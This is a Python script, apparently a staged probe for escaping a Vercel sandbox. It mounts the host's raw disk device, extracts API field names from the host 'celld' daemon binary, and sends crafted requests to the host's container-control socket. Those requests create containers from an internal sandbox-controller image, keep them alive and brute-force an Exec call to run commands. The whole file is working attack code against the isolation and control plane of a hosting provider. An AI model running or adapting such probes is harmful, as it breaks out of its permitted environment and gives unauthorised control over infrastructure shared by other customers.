# -*- coding: utf-8 -*-
"""vda21_field_probe: 二进制挖字段 + Create/Start 保活变体 + Exec 数字字段穷举
P0: 从 celld 二进制提取 CreateRequest/StartRequest/ExecRequest 的 json/protobuf 字段标签
P1: 保活变体: Start 带 command / Create 数字字段名 / start:true
P2: 存活容器上 Exec 数字字段穷举 (1=container_id 假设)
P3: Process StreamOutput
输出落盘 + 哨兵 V21H_DONE"""
import os, time, socket, ctypes, re, struct

OUT = '/vercel/sandbox/v21h.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def rpc_raw(sockpath, path, body, ctype, t=6, shutdown_wr=False):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        if isinstance(body, str):
            body = body.encode()
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n' % (path, ctype, len(body))).encode() + body
        s.sendall(req)
        if shutdown_wr:
            try:
                s.shutdown(socket.SHUT_WR)
            except Exception:
                pass
        data = b''
        while True:
            try:
                chunk = s.recv(16384)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:1200].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''


def env_proto(payload):
    return b'\x00' + struct.pack('>I', len(payload)) + payload


def pstr(field_no, s):
    b = s.encode()
    tag = (field_no << 3) | 2
    out = bytearray()
    while tag > 127:
        out.append((tag & 127) | 128)
        tag >>= 7
    out.append(tag)
    l = len(b)
    while l > 127:
        out.append((l & 127) | 128)
        l >>= 7
    out.append(l)
    return bytes(out) + b


def pbool(field_no, v):
    tag = (field_no << 3) | 0
    out = bytearray()
    while tag > 127:
        out.append((tag & 127) | 128)
        tag >>= 7
    out.append(tag)
    out.append(1 if v else 0)
    return bytes(out)


def main():
    MOUNTED = False
    try:
        for ln in open('/proc/self/mountinfo', errors='replace'):
            if '/mnt/vdax' in ln:
                MOUNTED = True
                break
    except Exception:
        pass
    if not MOUNTED:
        os.makedirs('/mnt/vdax', exist_ok=True)
        ret = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax', b'xfs', 0, b'')
        log('mount ret=%d' % ret)

    sp = '/mnt/vdax/run/cell/cell.sock'
    IMG = '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59'
    CSVC = '/vercel.hive.cell.api.containers.v1.ContainersService'
    PSVC = '/vercel.hive.cell.api.processes.v1.ProcessService'

    # P0: 二进制挖字段
    log('=== P0 binary field mining ===')
    try:
        data = open('/mnt/vdax/opt/vercel/celld', 'rb').read()
        # 找 json tag 模式
        tags = re.findall(rb'json:"([a-z_0-9]+),omitempty"', data)
        seen = []
        for t in tags:
            s = t.decode()
            if s not in seen:
                seen.append(s)
        log('json tags (%d): %s' % (len(seen), seen[:60]))
        # 找 protobuf tag
        ptags = re.findall(rb'protobuf:"[a-z_0-9]+,([0-9]+),opt,name=([a-z_0-9]+)', data)
        plist = []
        for num, name in ptags:
            key = (num.decode(), name.decode())
            if key not in plist:
                plist.append(key)
        log('proto tags (%d): %s' % (len(plist), plist[:50]))
        # 找 CreateRequest 上下文 4KB
        for msg in [b'CreateRequest', b'StartRequest', b'ExecRequest', b'StreamOutputRequest', b'StartRequest']:
            for m in re.finditer(re.escape(msg), data):
                i = m.start()
                seg = data[max(0, i - 200):i + 2500]
                jt = re.findall(rb'json:"([a-z_0-9]+),omitempty"', seg)
                pt = re.findall(rb'protobuf:"[a-z_0-9]+,([0-9]+),opt,name=([a-z_0-9]+)', seg)
                log('%s ctx: json=%s proto=%s' % (msg.decode(errors='replace'), [x.decode() for x in jt], [(n.decode(), k.decode()) for n, k in pt]))
                break
    except Exception as e:
        log('P0 ERR %s' % e)

    # P1: 保活变体
    log('=== P1 keepalive variants ===')
    ctrs = []

    def try_create(tag, body, wait_after=False):
        st, bd = rpc_raw(sp, CSVC + '/Create', body, 'application/json', t=30)
        m = re.search(r'"containerId":\s*"([^"]+)"', bd)
        if not m:
            log('create %-14s -> %s | %s' % (tag, st, bd[:200]))
            return None
        cid = m.group(1)
        log('create %-14s -> 200 CID=%s' % (tag, cid))
        ctrs.append((tag, cid))
        return cid

    # A: Start 带 command
    cid = try_create('startcmd', '{"image":"%s"}' % IMG)
    if cid:
        st, bd = rpc_raw(sp, CSVC + '/Start', '{"container_id":"%s","command":"/bin/sleep 300"}' % cid, 'application/json', t=8)
        log('  start+cmd -> %s | %s' % (st, bd[:200]))
        st, bd = rpc_raw(sp, CSVC + '/Wait', '{"container_id":"%s"}' % cid, 'application/json', t=3)
        log('  wait -> %s | %s  [%s]' % (st, bd[:150], 'ALIVE' if st == 'NORESP' else 'EXITED'))
    time.sleep(0.3)

    # B: Create 数字字段名 2-6
    for n in range(2, 7):
        cid = try_create('num%d' % n, '{"1":"%s","%d":"/bin/sleep 300"}' % (IMG, n))
        if cid:
            st, bd = rpc_raw(sp, CSVC + '/Start', '{"container_id":"%s"}' % cid, 'application/json', t=8)
            st2, bd2 = rpc_raw(sp, CSVC + '/Wait', '{"container_id":"%s"}' % cid, 'application/json', t=3)
            alive = 'ALIVE' if st2 == 'NORESP' else 'EXITED'
            log('  num%d start=%s wait=%s [%s] %s' % (n, st.split()[1] if ' ' in st else st, st2.split()[1] if ' ' in st2 else st2, alive, bd2[:120]))
        time.sleep(0.2)

    # C: start:true / attach / no_start
    for tag, extra in [('starttrue', '"start":true'), ('attach', '"attach":true'), ('nostart', '"start":false')]:
        cid = try_create(tag, '{"image":"%s","command":"/bin/sleep 300",%s}' % (IMG, extra))
        if cid:
            st, bd = rpc_raw(sp, CSVC + '/Wait', '{"container_id":"%s"}' % cid, 'application/json', t=3)
            log('  %s wait -> %s | %s [%s]' % (tag, st, bd[:150], 'ALIVE' if st == 'NORESP' else 'EXITED'))
        time.sleep(0.2)

    # P2: Exec 数字字段 (在可能存活的容器上)
    log('=== P2 Exec numeric fields ===')
    for tag, cid in ctrs:
        for ncmd in range(1, 5):
            body = '{"1":"%s","%d":"id"}' % (cid, ncmd)
            st, bd = rpc_raw(sp, CSVC + '/Exec', body, 'application/json', t=4)
            log('exec %s field%d -> %s | %s' % (tag, ncmd, st, bd[:250].replace('\n', ' ')))
            time.sleep(0.2)

    # P3: Process StreamOutput (有 pid 则用)
    log('=== P3 Process StreamOutput ===')
    pid27 = 'hvcp_' + 'a' * 27
    payload = pstr(1, pid27) + pbool(2, True)
    st, bd = rpc_raw(sp, PSVC + '/StreamOutput', env_proto(payload), 'application/connect+proto', t=5, shutdown_wr=True)
    log('stream -> %s | %s' % (st, bd[:300].replace('\n', ' ')))

    # P4: 清理
    for tag, cid in ctrs:
        st, bd = rpc_raw(sp, CSVC + '/Kill', '{"container_id":"%s"}' % cid, 'application/json', t=4)
        log('kill %s -> %s | %s' % (tag, st, bd[:120]))

    log('V21H_DONE')
    f.close()


if __name__ == '__main__':
    main()
